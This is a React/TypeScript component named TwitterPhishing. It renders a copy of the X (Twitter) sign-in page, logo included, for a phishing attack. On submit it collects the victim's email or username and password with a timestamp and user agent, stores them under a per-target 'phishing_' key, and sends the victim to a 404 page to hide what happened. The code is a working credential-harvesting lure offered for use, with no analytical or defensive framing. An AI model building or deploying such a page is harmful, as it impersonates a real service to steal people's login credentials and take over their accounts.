
import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';

const TwitterPhishing = () => {
  const { userId } = useParams();
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    const capturedData = {
      platform: 'Twitter',
      email: formData.email,
      password: formData.password,
      timestamp: Date.now(),
      ip: 'Unknown',
      userAgent: navigator.userAgent
    };

    const existingData = JSON.parse(localStorage.getItem(`phishing_${userId}`) || '[]');
    existingData.push(capturedData);
    localStorage.setItem(`phishing_${userId}`, JSON.stringify(existingData));

    navigate('/404-not-found');
  };

  return (
    <div className="min-h-screen bg-black flex items-center justify-center px-4">
      <div className="w-full max-w-md bg-black text-white">
        {/* Header */}
        <div className="text-center mb-8">
          <svg viewBox="0 0 24 24" className="w-8 h-8 mx-auto mb-6 fill-white">
            <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/>
          </svg>
          <h1 className="text-3xl font-bold mb-2">Sign in to X</h1>
        </div>

        {/* Login Form */}
        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <Input
              type="text"
              placeholder="Phone, email, or username"
              value={formData.email}
              onChange={(e) => setFormData({...formData, email: e.target.value})}
              className="w-full h-14 px-4 bg-transparent border border-gray-700 rounded-md text-white text-lg placeholder-gray-500 focus:border-blue-500"
              required
            />
          </div>
          
          <div>
            <Input
              type="password"
              placeholder="Password"
              value={formData.password}
              onChange={(e) => setFormData({...formData, password: e.target.value})}
              className="w-full h-14 px-4 bg-transparent border border-gray-700 rounded-md text-white text-lg placeholder-gray-500 focus:border-blue-500"
              required
            />
          </div>

          <Button 
            type="submit"
            className="w-full bg-white hover:bg-gray-200 text-black h-12 text-lg font-bold rounded-full"
          >
            Sign in
          </Button>
        </form>

        <div className="mt-8 text-center">
          <p className="text-gray-500 text-sm mb-4">
            Don't have an account? 
            <a href="#" className="text-blue-500 ml-1">Sign up</a>
          </p>
          <a href="#" className="text-blue-500 text-sm">Forgot password?</a>
        </div>

        <div className="flex items-center my-8">
          <div className="flex-1 border-t border-gray-700"></div>
          <span className="px-4 text-gray-500 text-sm">or</span>
          <div className="flex-1 border-t border-gray-700"></div>
        </div>

        <Button className="w-full bg-transparent border border-gray-700 text-white h-12 font-semibold rounded-full hover:bg-gray-900">
          Continue with Google
        </Button>
      </div>
    </div>
  );
};

export default TwitterPhishing;
